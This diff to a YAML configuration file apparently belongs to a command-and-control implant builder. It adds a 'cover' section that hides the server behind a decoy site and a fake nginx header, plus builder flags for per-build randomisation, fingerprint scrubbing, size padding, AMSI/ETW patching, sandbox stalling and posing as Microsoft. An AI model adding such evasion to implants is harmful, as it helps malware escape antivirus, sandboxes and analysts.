@@ -13,6 +13,12 @@ beacon:
   default_sleep: 3
   default_jitter: 20
 
+# what a stranger sees. url: unauthenticated browser visits to / are bounced to
+# a normal site. server: value of the Server header (masks uvicorn).
+cover:
+  url: ""
+  server: nginx
+
 builder:
   go_bin: go
   implant_dir: ../implant
@@ -23,6 +29,11 @@ builder:
   garble: false           # obfuscate identifiers if garble is installed
   upx: false              # compress binaries if upx is installed
   metadata: true          # vendor metadata + manifest + icon (anti-ML)
+  randomize: true         # pick a random vendor/size per build (no stable hash)
+  scrub: true             # erase Go build-info + module path fingerprints
+  pad: true               # random filler so artifacts differ in size
+  stealth: auto           # auto = AMSI/ETW patch + sandbox stall, off = neither
+  workers: 4              # parallel command execution inside the implant
   encrypt_payload: true   # AES-GCM seal the embedded implant
   vendor: "Microsoft Corporation"
   sign_pfx: ""            # optional .pfx -> Authenticode sign every artifact
